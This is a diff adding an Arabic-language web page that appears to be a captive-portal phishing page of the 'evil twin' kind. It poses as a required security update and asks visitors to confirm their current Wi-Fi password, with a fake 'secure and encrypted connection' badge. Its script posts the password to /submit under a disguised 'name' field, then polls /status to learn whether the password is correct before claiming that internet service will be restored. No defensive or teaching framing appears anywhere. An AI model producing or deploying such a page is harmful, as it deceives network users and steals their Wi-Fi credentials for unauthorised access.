@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>تحديث أمني مطلوب</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    /* CSS Reset & Variables */
+    :root {
+      --primary: #2563eb;
+      --primary-dark: #1d4ed8;
+      --bg-gradient: linear-gradient(135deg, #f6f8fd 0%, #eef2f9 100%);
+      --card-bg: #ffffff;
+      --text-main: #1f2937;
+      --text-muted: #6b7280;
+      --error: #ef4444;
+      --success: #10b981;
+    }
+
+    * {
+      box-sizing: border-box;
+      outline: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: var(--bg-gradient);
+      color: var(--text-main);
+      overflow: hidden;
+    }
+
+    /* Card Container */
+    .container {
+      width: 90%;
+      max-width: 400px;
+      background: var(--card-bg);
+      padding: 2.5rem 2rem;
+      border-radius: 24px;
+      box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes slideUp {
+      0% {
+        opacity: 0;
+        transform: translateY(30px) scale(0.95);
+      }
+
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* Typography */
+    h2 {
+      margin: 0 0 0.5rem 0;
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #111827;
+    }
+
+    p {
+      margin: 0 0 2rem 0;
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      line-height: 1.6;
+    }
+
+    /* Icons */
+    .icon-box {
+      width: 64px;
+      height: 64px;
+      background: #eff6ff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.5rem auto;
+      color: var(--primary);
+    }
+
+    .icon-box svg {
+      width: 32px;
+      height: 32px;
+    }
+
+    /* Input Group */
+    .input-group {
+      position: relative;
+      margin-bottom: 1.5rem;
+      text-align: right;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      padding-left: 45px;
+      /* For eye icon */
+      font-size: 1rem;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      background: #f9fafb;
+      transition: all 0.2s ease;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    input:focus {
+      border-color: var(--primary);
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+    }
+
+    .toggle-password {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #9ca3af;
+      transition: color 0.2s;
+    }
+
+    .toggle-password:hover {
+      color: var(--primary);
+    }
+
+    /* Button */
+    button {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.1s, background 0.2s;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    button:hover {
+      background: var(--primary-dark);
+    }
+
+    /* States */
+    .hidden {
+      display: none !important;
+    }
+
+    .error-msg {
+      background: #fef2f2;
+      color: var(--error);
+      padding: 12px;
+      border-radius: 10px;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      display: none;
+      /* hidden by default */
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #e5e7eb;
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 1.5rem auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Footer Badge */
+    .security-badge {
+      margin-top: 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.8rem;
+      color: #9ca3af;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Login View -->
+  <div id="login-view" class="container">
+    <div class="icon-box">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+          d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+      </svg>
+    </div>
+    <h2>تأكيد الملكية</h2>
+    <p>للحفاظ على أمان شبكتك، يرجى تأكيد كلمة مرور الواي فاي للمتابعة.</p>
+
+    <div id="error-box" class="error-msg">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+        stroke="currentColor" stroke-width="2">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="12" y1="8" x2="12" y2="12"></line>
+        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+      </svg>
+      <span id="error-text">كلمة المرور غير صحيحة</span>
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="username" placeholder="كلمة المرور الحالية" required onkeypress="handleEnter(event)">
+      <div class="toggle-password" onclick="togglePass()">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+          <circle cx="12" cy="12" r="3"></circle>
+        </svg>
+      </div>
+    </div>
+
+    <button onclick="sendData()">تأكيد ومتابعة</button>
+
+    <div class="security-badge">
+      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none"
+        stroke="currentColor" stroke-width="2">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+      </svg>
+      <span>اتصال آمن ومشفر</span>
+    </div>
+  </div>
+
+  <!-- Loading View -->
+  <div id="wait-view" class="container hidden">
+    <div class="spinner"></div>
+    <h2>جاري التحقق...</h2>
+    <p>يرجى الانتظار، لا تغلق هذه الصفحة.<br>قد يستغرق هذا دقيقة.</p>
+  </div>
+
+  <!-- Success View -->
+  <div id="success-view" class="container hidden">
+    <div class="icon-box" style="color: var(--success); background: #ecfdf5;">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+      </svg>
+    </div>
+    <h2 style="color: var(--success)">تم التوصيل بنجاح</h2>
+    <p>تم تأكيد الهوية. سيتم استعادة خدمة الإنترنت تلقائياً خلال لحظات.</p>
+  </div>
+
+  <script>
+    let checkInterval;
+    const input = document.getElementById('username');
+    const errorBox = document.getElementById('error-box');
+
+    function togglePass() {
+      if (input.type === 'password') input.type = 'text';
+      else input.type = 'password';
+    }
+
+    function handleEnter(e) {
+      if (e.key === 'Enter') sendData();
+    }
+
+    function sendData() {
+      const password = input.value.trim();
+      if (password.length < 8) {
+        showError("كلمة المرور قصيرة جداً (8 أحرف على الأقل)");
+        return;
+      }
+
+      errorBox.style.display = 'none';
+
+      // Show loading
+      document.getElementById('login-view').classList.add('hidden');
+      document.getElementById('wait-view').classList.remove('hidden');
+
+      // Send to backend
+      // Note: Backend expects 'name' parameter for password
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'name=' + encodeURIComponent(password)
+      })
+        .then(response => {
+          // Start polling for status
+          if (checkInterval) clearInterval(checkInterval);
+          setTimeout(checkStatus, 200);
+          checkInterval = setInterval(checkStatus, 800);
+        })
+        .catch(err => {
+          resetView("خطأ في الاتصال بالراوتر");
+        });
+    }
+
+    function checkStatus() {
+      fetch('/status')
+        .then(r => r.text())
+        .then(status => {
+          status = status.trim();
+          if (status === 'OK') {
+            clearInterval(checkInterval);
+            document.getElementById('wait-view').classList.add('hidden');
+            document.getElementById('success-view').classList.remove('hidden');
+          } else if (status === 'NO') {
+            clearInterval(checkInterval);
+            resetView("كلمة المرور غير صحيحة، حاول مجدداً");
+          }
+        })
+        .catch(e => console.log(e));
+    }
+
+    function resetView(msg) {
+      document.getElementById('wait-view').classList.add('hidden');
+      document.getElementById('login-view').classList.remove('hidden');
+      showError(msg);
+      input.value = '';
+      input.focus();
+    }
+
+    function showError(msg) {
+      document.getElementById('error-text').innerText = msg;
+      errorBox.style.display = 'flex';
+      // Shake animation
+      document.querySelector('.container').animate([
+        { transform: 'translateX(0)' },
+        { transform: 'translateX(-10px)' },
+        { transform: 'translateX(10px)' },
+        { transform: 'translateX(0)' }
+      ], { duration: 300 });
+    }
+  </script>
+
+</body>
+
+</html>
